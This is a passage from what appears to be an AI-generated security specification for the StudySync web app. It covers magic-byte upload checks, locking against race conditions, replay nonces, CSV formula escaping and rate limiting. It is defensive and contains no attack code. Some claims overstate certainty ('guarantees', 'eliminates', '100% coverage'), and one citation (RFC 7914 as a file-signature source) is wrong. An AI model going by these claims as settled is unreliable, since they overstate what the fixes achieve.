1. *From observation of WebP RIFF container*: Since all RIFF files (WAV, AVI, WebP, ANI) share `52 49 46 46`, inspecting only bytes 0-3 allows arbitrary WAV/AVI files to masquerade as WebP proof photos. Therefore, the specification requires inspecting 12 bytes: `RIFF` at 0-3, file size at 4-7, `WEBP` at 8-11, and chunk headers (`VP8 `, `VP8L`, `VP8X`) at 12-15.
2. *From observation of LockService in backend*: While `handleRegisterUser` and `handleSubmitDailyLog` are concurrency-safe under `LockService`, `handleLogTestMark` and `handleDeleteTestMark` perform unlocked reads and writes to `TestMarks` sheet. Under concurrent student submissions, test mark row insertion will experience race conditions. Therefore, `LockService` must wrap all mutation handlers.
3. *From observation of Replay Attacks*: A valid daily log or test mark payload intercepted by a network observer could be replayed. Adding an Idempotency Envelope containing a 128-bit cryptographic nonce and a UTC timestamp with a strict ±300s server drift window guarantees single-execution semantics.
4. *From observation of Formula Injection in CSV*: When admins export member lists or study logs to CSV, spreadsheet applications (Excel, LibreOffice, Google Sheets) execute cells starting with `=`, `+`, `-`, `@` as formulas or DDE commands. Neutralizing them with leading single-quote (`'`) eliminates CWE-1236.
5. *From observation of Client Rate Limiting*: An in-memory rate limiter is bypassed simply by refreshing the browser tab or opening multiple tabs. Multi-tab LocalStorage and BroadcastChannel synchronization ensures rate-limiting policies remain invariant across user sessions.

### 5.3 Caveats
- Google Apps Script runs in a serverless sandbox with a maximum execution timeout of 6 minutes (360 seconds) and a `LockService` maximum wait of 30 seconds.
- Static export (`output: 'export'`) on Next.js 14 means all server-side rendering logic runs client-side on Firebase Hosting; thus, client-side rate limiters act as the first line of defense, while server-side deduplication in Apps Script acts as the authoritative boundary.
- No source code or production test files were modified during this specification mining turn, preserving absolute read-only integrity.

### 5.4 Conclusion
StudySync possesses a robust functional foundation. Implementing the specifications detailed in this report will elevate its resilience to enterprise grade by:
1. Eliminating file upload vulnerabilities via 12-byte WebP/PNG/JPEG magic byte verification and multi-signature polyglot rejection.
2. Hardening concurrency and anti-replay defenses via LockService on all endpoints, 128-bit nonces, and ±300s timestamp drift checks.
3. Securing user inputs with context-aware anti-XSS entity encoding, safe URI schemes, CSV formula escaping, and IDOR least-privilege scoping.
4. Enforcing multi-tab synchronized sliding-window rate limiters with progressive backpressure.
5. Expanding the 5-tier test harness to validate all adversarial vectors with 100% automated coverage.

### 5.5 Verification Method
To independently verify this specification:
1. Inspect the authoritative files:
   - `src/lib/security.ts`
   - `src/lib/api.ts`
   - `backend/Code.gs`
   - `tests/tier1-5`
2. Execute the existing master test suite to verify baseline integrity:
   ```bash
   node tests/e2e-runner.js
   node tests/tier5-adversarial.test.js
   ```
3. Verify test vector definitions in Section 4.5.1 against standard file signature databases (Gary Kessler File Signatures Table, RFC 2083 PNG, RFC 7914, WebP Container Spec).
